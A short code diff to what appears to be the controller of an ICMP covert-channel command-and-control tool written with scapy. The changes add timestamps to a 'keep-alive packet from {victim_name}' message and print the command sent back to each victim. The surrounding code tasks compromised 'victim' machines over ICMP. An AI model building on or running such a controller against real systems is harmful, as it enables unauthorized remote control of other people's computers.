@@ -1,4 +1,5 @@
 from scapy.all import sniff,send,IP,ICMP
+from datetime import datetime
 from pathlib import Path
 import base64
 import json
@@ -48,9 +49,9 @@ def handle_load(load, path, sender_ip):
         print(deserialized_load["d"])
 
     else:
-        print(f"\nkeep-alive packet from {victim_name}[{sender_ip}] received")
+        print(f"\n[{datetime.now().strftime("%H:%M:%S")}]keep-alive packet from {victim_name}[{sender_ip}] received")
         command = get_victim_command(victim_name, path)
-        # print(f"sent command: {command}")
+        print(f"sent command: {command}")
         return command
 
     return ""
